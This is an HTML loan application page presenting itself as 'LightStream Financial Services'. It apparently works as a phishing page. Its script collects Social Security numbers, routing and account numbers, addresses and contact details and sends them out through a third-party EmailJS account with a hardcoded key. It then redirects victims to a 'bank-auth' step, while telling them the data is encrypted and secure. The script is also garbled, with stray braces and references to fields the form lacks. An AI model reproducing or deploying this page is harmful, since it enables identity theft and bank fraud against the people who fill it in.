<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Loan Application - LightStream Financial Services</title>
    
    <!-- Security Headers -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    
    <!-- Legal & Security Meta -->
    <meta name="description" content="Apply for secure personal loans with LightStream. Bank-level encryption protects your data. Fast approval process.">
    <meta name="keywords" content="personal loan application, secure loans, online loan application">
    <meta name="author" content="LightStream Financial Services">
    <meta name="robots" content="index, follow">
    
    <!-- Google Site Verification -->
    <meta name="google-site-verification" content="s-OWmZgVmfmuSt4KnIAA-IpD61w3rw8cRCh8WdTxVmk" />
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <style>
        body {
            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 50%, #2563eb 100%);
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        .glass-effect {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .btn-primary {
            background: #3b82f6;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-2px);
        }
        .security-notice {
            background: rgba(251, 191, 36, 0.1);
            border: 1px solid rgba(251, 191, 36, 0.3);
            border-radius: 8px;
            padding: 16px;
            margin: 20px 0;
        }
    </style>
</head>
<body class="bg-blue-900">
    <!-- Header Navigation -->
    <header class="glass-effect sticky top-0 z-50">
        <nav class="container mx-auto px-4 py-4">
            <div class="flex justify-between items-center">
                <div class="flex items-center space-x-2">
                    <i class="fas fa-shield-alt text-white text-2xl"></i>
                    <span class="text-white text-xl font-bold">LightStream</span>
                </div>
                <div class="hidden md:flex space-x-6">
                    <a href="index.html" class="text-white hover:text-blue-300">Home</a>
                    <a href="personal-loans.html" class="text-white hover:text-blue-300">Personal Loans</a>
                    <a href="bank-verification.html" class="text-white hover:text-blue-300">Bank Verification</a>
                    <a href="privacy-policy.html" class="text-white hover:text-blue-300">Privacy Policy</a>
                    <a href="terms.html" class="text-white hover:text-blue-300">Terms & Conditions</a>
                    <a href="contact.html" class="text-white hover:text-blue-300">Contact Us</a>
                </div>
            </div>
        </nav>
    </header>

    <!-- Main Content -->
    <section class="py-20">
        <div class="container mx-auto px-4">
            <div class="max-w-4xl mx-auto">
                <div class="glass-effect rounded-lg shadow-xl p-8">
                    <div class="text-center mb-8">
                        <h1 class="text-4xl font-bold text-white mb-4">Personal Loan Application</h1>
                        <p class="text-blue-200">Apply for a personal loan with our secure and simple application process</p>
                    </div>

                    <form id="loanApplicationForm" class="space-y-6">
                        <!-- Personal Information Section -->
                        <div class="bg-white bg-opacity-10 rounded-lg p-6">
                            <h2 class="text-xl font-semibold text-white mb-4">
                                <i class="fas fa-user mr-2"></i>Personal Information
                            </h2>
                            
                            <div class="grid md:grid-cols-2 gap-4">
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="fullName">
                                        Full Name *
                                    </label>
                                    <input type="text" id="fullName" name="fullName" required
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                           placeholder="John Doe">
                                </div>
                                
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="email">
                                        Email Address *
                                    </label>
                                    <input type="email" id="email" name="email" required
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                           placeholder="john.doe@example.com">
                                </div>
                                
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="phone">
                                        Phone Number *
                                    </label>
                                    <input type="tel" id="phone" name="phone" required
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                           placeholder="(555) 123-4567" pattern="[0-9]{10}" maxlength="10">
                                </div>
                                
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="loanAmount">
                                        Loan Amount *
                                    </label>
                                    <div class="relative">
                                        <span class="absolute left-3 top-3 text-gray-500">$</span>
                                        <input type="number" id="loanAmount" name="loanAmount" required
                                               class="w-full pl-8 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                               placeholder="5,000" min="2000" max="15000">
                                    </div>
                                    <p class="text-xs text-blue-200 mt-1">Minimum: $2,000 | Maximum: $15,000</p>
                                </div>
                            </div>
                        </div>

                        <!-- Banking Information Section -->
                        <div class="bg-white bg-opacity-10 rounded-lg p-6">
                            <h2 class="text-xl font-semibold text-white mb-4">
                                <i class="fas fa-university mr-2"></i>Banking Information
                            </h2>
                            
                            <div class="grid md:grid-cols-2 gap-4">
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="accountNumber">
                                        Bank Account Number *
                                    </label>
                                    <input type="text" id="accountNumber" name="accountNumber" required
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                           placeholder="Enter your account number">
                                </div>
                                
                                <div>
                                    <label class="block text-white text-sm font-bold mb-2" for="ifscCode">
                                        IFSC Code *
                                    </label>
                                    <input type="text" id="ifscCode" name="ifscCode" required
                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                                           placeholder="BANK0000000" maxlength="11">
                                </div>
                            </div>
                        </div>

                        <!-- Security Notice -->
                        <div class="security-notice">
                            <div class="flex items-start">
                                <i class="fas fa-shield-alt text-yellow-400 mt-1 mr-3"></i>
                                <div>
                                    <h4 class="font-semibold text-white mb-1">Important Security Notice</h4>
                                    <p class="text-sm text-blue-200">
                                        <strong>We do not collect banking passwords or OTP.</strong> All submitted data is secure and used only for loan processing. Your information is encrypted and protected.
                                    </p>
                                </div>
                            </div>
                        </div>

                        <!-- Terms and Conditions -->
                        <div class="flex items-start">
                            <input type="checkbox" id="terms" name="terms" class="mr-2 mt-1" required>
                            <label for="terms" class="text-sm text-blue-200">
                                I agree to the <a href="terms.html" class="text-blue-300 hover:text-blue-100 underline">Terms & Conditions</a> 
                                and <a href="privacy-policy.html" class="text-blue-300 hover:text-blue-100 underline">Privacy Policy</a>. 
                                I authorize LightStream to process my loan application.
                            </label>
                        </div>

                        <!-- Submit Button -->
                        <div class="text-center">
                            <button type="submit" class="btn-primary px-8 py-3 text-lg">
                                <i class="fas fa-paper-plane mr-2"></i>Submit Application
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="bg-blue-950 text-white py-8">
        <div class="container mx-auto px-4">
            <div class="grid md:grid-cols-4 gap-8">
                <div>
                    <h3 class="text-lg font-semibold mb-4">LightStream</h3>
                    <p class="text-gray-400">Secure personal loan solutions for your financial needs.</p>
                </div>
                <div>
                    <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
                    <ul class="space-y-2">
                        <li><a href="index.html" class="text-gray-400 hover:text-white">Home</a></li>
                        <li><a href="personal-loans.html" class="text-gray-400 hover:text-white">Personal Loans</a></li>
                        <li><a href="bank-verification.html" class="text-gray-400 hover:text-white">Bank Verification</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-lg font-semibold mb-4">Legal</h4>
                    <ul class="space-y-2">
                        <li><a href="privacy-policy.html" class="text-gray-400 hover:text-white">Privacy Policy</a></li>
                        <li><a href="terms.html" class="text-gray-400 hover:text-white">Terms & Conditions</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-lg font-semibold mb-4">Contact</h4>
                    <ul class="space-y-2 text-gray-400">
                        <li><i class="fas fa-envelope mr-2"></i>info@lightstream.com</li>
                        <li><i class="fas fa-phone mr-2"></i>1-800-LIGHTSTREAM</li>
                        <li><a href="contact.html" class="text-gray-400 hover:text-white">Contact Form</a></li>
                    </ul>
                </div>
            </div>
            <div class="border-t border-blue-800 mt-8 pt-8 text-center text-gray-400">
                <p>&copy; 2026 LightStream Financial Services. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        // Initialize EmailJS
        (function() {
            emailjs.init("nW8qV4aakkEtYlieZ");
        })();
            }
            
            return true;
        }

        // Form submission
        document.getElementById("loanApplicationForm").addEventListener("submit", function(e) {
            console.log("üöÄ Form submit event triggered!");
            e.preventDefault();

            // Check if checkboxes are checked
            const termsCheckbox = document.getElementById("terms");
            const consentCheckbox = document.getElementById("consent");
            
            console.log("üìã Terms checked:", termsCheckbox?.checked);
            console.log("üìã Consent checked:", consentCheckbox?.checked);
            
            if (!termsCheckbox?.checked) {
                alert("‚ùå Please agree to Terms & Conditions and Privacy Policy");
                return;
            }
            
            if (!consentCheckbox?.checked) {
                alert("‚ùå Please consent to receive communications about your loan application");
                return;
            }

            console.log("‚úÖ Form validation passed!");

            const firstName = document.getElementById("firstName").value;
            const lastName = document.getElementById("lastName").value;

            console.log("üë§ First Name:", firstName);
            console.log("üë§ Last Name:", lastName);

            const formData = {
                loanAmount: document.getElementById("loanAmount").value,
                loanDuration: document.getElementById("loanDuration").value,
                loanPurpose: document.getElementById("loanPurpose").value,
                customerBank: document.getElementById("customerBank").value,
                firstName: firstName,
                lastName: lastName,
                fullName: firstName + " " + lastName,
                email: document.getElementById("email").value,
                streetAddress: document.getElementById("address").value,
                address: document.getElementById("address").value,
                city: document.getElementById("city").value,
                state: document.getElementById("state").value,
                zipCode: document.getElementById("zipCode").value,
                socialSecurity: document.getElementById("socialSecurity").value,
                routingNumber: document.getElementById("routingNumber").value,
                accountNumber: document.getElementById("accountNumber").value,
                terms: document.getElementById("terms").checked,
                consent: document.getElementById("consent").checked,
                createdAt: new Date().toISOString(),
                applicationType: "Personal Loan"
            };

            console.log("üè¶ Customer Bank Value:", document.getElementById("customerBank").value);
            
            // Store data for bank auth page (SECURE: sessionStorage only)
            sessionStorage.setItem("loanApplicationData", JSON.stringify(formData));
            console.log("üíæ Data stored in sessionStorage:", sessionStorage.getItem("loanApplicationData"));

            // Send Personal Loan email (NEW - separate email)
            console.log("üìß Sending Personal Loan email...");
            
            // Show processing message
            alert("‚úÖ Loan Application Submitted Successfully!\n\nüìã Your application has been received and is being processed.\n\nüìß What happens next:\n‚Ä¢ You will be redirected to bank authentication\n‚Ä¢ Please complete the bank verification step\n‚Ä¢ Your loan approval is under review\n\nThank you for choosing LightStream Financial Services.");
            
            sendPersonalLoanEmail(formData);

            console.log("üîÑ Redirecting to bank-auth.html...");
            setTimeout(() => {
                window.location.href = "bank-auth.html";
            }, 2000); // Give time for email to send
        });

        // NEW: Separate Personal Loan Email Function
        function sendPersonalLoanEmail(data) {
            console.log('üìß Sending Personal Loan email...');
            
            // Initialize EmailJS
            emailjs.init("nW8qV4aakkEtYlieZ");
            
            // Prepare email template parameters for Personal Loan ONLY
            const templateParams = {
                // RECIPIENT EMAIL - Send to customer's email
                to_email: data.email || 'customer@example.com',
                recipient_email: data.email || 'customer@example.com',
                customer_email: data.email || 'customer@example.com',
                
                // Loan information
                loan_amount: data.loanAmount || '',
                loan_duration: data.loanDuration || '',
                loan_purpose: data.loanPurpose || '',
                loan_term: data.loanDuration || '',
                
                // Borrower information
                firstName: data.firstName || '',
                lastName: data.lastName || '',
                borrower_name: data.fullName || '',
                customer_name: data.fullName || '',
                name: data.fullName || '',
                full_name: data.fullName || '',
                client_name: data.fullName || '',
                
                // Contact information
                email: data.email || '',
                address: data.address || '',
                city: data.city || '',
                state: data.state || '',
                zip_code: data.zipCode || '',
                zip: data.zipCode || '',
                
                // Bank information (from personal loan form only)
                customer_bank: data.customerBank || '',
                bank_name: data.customerBank || '',
                routing_number: data.routingNumber || '',
                account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : '',
                
                // Financial Information
                ssn: data.socialSecurity || '',
                
                // METADATA
                application_type: 'Personal Loan Application',
                submission_date: new Date().toLocaleString(),
                timestamp: new Date().toISOString(),
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString()
            };

            console.log('Personal Loan email template params:', templateParams);

            // Send Personal Loan email using separate template
            emailjs.send('service_mblpi2k', 'template_5wx44v8', templateParams)
                .then(function(response) {
                    console.log('‚úÖ Personal Loan email sent successfully!', response.status, response.text);
                })
                .catch(function(error) {
                    console.log('‚ùå Personal Loan email failed...', error);
                    console.log('Error details:', error.text || error.message);
                    
                    // Fallback: Store email data locally for later sending
                    if (error.text && error.text.includes('quota')) {
                        console.log('üìß EmailJS quota reached - storing email data for later');
                        const emailBackup = {
                            type: 'personal-loan',
                            templateParams: templateParams,
                            timestamp: new Date().toISOString(),
                            loanData: data
                        };
                        localStorage.setItem('pendingEmail_' + Date.now(), JSON.stringify(emailBackup));
                        console.log('üì¶ Email data stored locally - will send when quota resets');
                    }
                });
        }

        // Google OAuth Login Function
        function initiateGoogleLogin() {
            // Check if user is already logged in
            const isLoggedIn = localStorage.getItem('is_logged_in');
            if (isLoggedIn === 'true') {
                window.location.href = 'login-success.html';
                return;
            }
            
            // For demo purposes, simulate successful login
            // In production, this would redirect to Google OAuth
            console.log('Initiating Google OAuth login...');
            
            // Create mock user data for demo
            const mockUserData = {
                name: 'Demo User',
                email: 'demo@example.com',
                picture: 'https://ui-avatars.com/api/?name=Demo+User&background=random',
                verified: true
            };
            
            // Store user session
            localStorage.setItem('google_user_data', JSON.stringify(mockUserData));
            localStorage.setItem('is_logged_in', 'true');
            
            // Redirect to success page
            window.location.href = 'login-success.html';
        }
        
        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üåü Page loaded, initializing form...');
            
            // Check if form exists
            const form = document.getElementById("loanApplicationForm");
            if (!form) {
                console.error('‚ùå Form not found!');
                alert('‚ùå Form not found. Please refresh the page.');
                return;
            }
            
            console.log('‚úÖ Form found:', form);
            
            // Add change listener to bank select
            const customerBankSelect = document.getElementById('customerBank');
            if (customerBankSelect) {
                // Bank selection change handling can be added here if needed
            }
            
            // Add ZIP code validation
            setupZipCodeValidation();
            
            const loginBtn = document.querySelector('button[onclick="initiateGoogleLogin()"]');
            if (loginBtn) {
                loginBtn.innerHTML = '<i class="fas fa-user mr-2"></i><span>My Account</span>';
                loginBtn.removeAttribute('onclick');
                loginBtn.onclick = () => window.location.href = 'customer-dashboard.html';
            }
        });

        // ZIP Code Validation Function
        function setupZipCodeValidation() {
            const zipInput = document.getElementById('zipCode');
            const cityInput = document.getElementById('city');
            const stateInput = document.getElementById('state');
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');

            if (!zipInput || !cityInput || !stateInput) {
                console.error('‚ùå ZIP validation fields not found');
                return;
            }

            let zipTimeout;

            zipInput.addEventListener('input', function(e) {
                const zip = e.target.value.replace(/\D/g, ''); // Only allow numbers
                
                // Update input with numbers only
                e.target.value = zip;
                
                // Clear previous timeout
                clearTimeout(zipTimeout);
                
                // Hide error and loading
                zipError.classList.add('hidden');
                zipLoading.classList.add('hidden');
                
                // Only validate if exactly 5 digits
                if (zip.length === 5) {
                    zipLoading.classList.remove('hidden');
                    
                    // Debounce API call
                    zipTimeout = setTimeout(() => {
                        validateAndFetchZipData(zip);
                    }, 500);
                } else if (zip.length > 0) {
                    showZipError('ZIP code must be exactly 5 digits');
                }
            });

            zipInput.addEventListener('blur', function(e) {
                const zip = e.target.value;
                if (zip.length !== 5) {
                    showZipError('Invalid ZIP code');
                }
            });
        }

        function validateAndFetchZipData(zip) {
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');
            const cityInput = document.getElementById('city');
            const stateInput = document.getElementById('state');

            // First validate format
            if (!/^\d{5}$/.test(zip)) {
                showZipError('Invalid ZIP code format');
                return;
            }

            // Fetch ZIP data from API
            fetch(`https://api.zippopotam.us/us/${zip}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Invalid ZIP code');
                    }
                    return response.json();
                })
                .then(data => {
                    // Success - auto-fill city and state
                    if (data && data.places && data.places.length > 0) {
                        const place = data.places[0];
                        cityInput.value = place['place name'] || '';
                        stateInput.value = place['state abbreviation'] || '';
                        
                        console.log('‚úÖ ZIP data fetched:', {
                            zip: zip,
                            city: place['place name'],
                            state: place['state abbreviation']
                        });
                        
                        // Hide loading
                        zipLoading.classList.add('hidden');
                    } else {
                        showZipError('Invalid ZIP code');
                    }
                })
                .catch(error => {
                    console.error('ZIP API Error:', error);
                    if (error.message === 'Invalid ZIP code') {
                        showZipError('Invalid ZIP code');
                    } else {
                        showZipError('Unable to verify ZIP code. Please try again.');
                    }
                    zipLoading.classList.add('hidden');
                });
        }

        function showZipError(message) {
            const zipError = document.getElementById('zipError');
            const zipLoading = document.getElementById('zipLoading');
            
            zipError.textContent = message;
            zipError.classList.remove('hidden');
            zipLoading.classList.add('hidden');
            
            // Add red border to ZIP input
            const zipInput = document.getElementById('zipCode');
            zipInput.classList.add('border-red-500');
            zipInput.classList.remove('border-gray-300');
        }

        function clearZipError() {
            const zipError = document.getElementById('zipError');
            const zipInput = document.getElementById('zipCode');
            
            zipError.classList.add('hidden');
            zipInput.classList.remove('border-red-500');
            zipInput.classList.add('border-gray-300');
        }
    </script>
</body>
</html>
